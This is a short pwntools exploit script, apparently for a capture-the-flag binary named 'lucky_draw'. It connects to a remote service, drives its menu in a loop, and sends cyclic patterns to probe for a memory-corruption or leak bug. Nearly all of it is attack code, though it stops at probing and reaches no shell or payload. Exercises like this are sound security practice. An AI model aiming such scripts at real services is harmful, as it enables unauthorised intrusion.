from pwn import *
exe = './lucky_draw'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level='debug'
def add(count, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", b"%d" % count)
    for _ in range(count):
        io.sendafter(b": ", name)

def draw():
    io.sendlineafter(b"> ", b"2")

def winner(call):
    io.sendlineafter(b"> ", b"3")
    io.recvuntil(b"winner: ")
    w = io.recvuntil(b"\nLeave", drop=True)
    io.sendlineafter(b": ", call)
    return w

# io = process(exe)
io = remote("192.168.0.52", 10206)

for i in range(31):
    add(10, cyclic(i))
    draw()
    winner(b"A")
    print(winner(cyclic(min(23, i))))

io.interactive()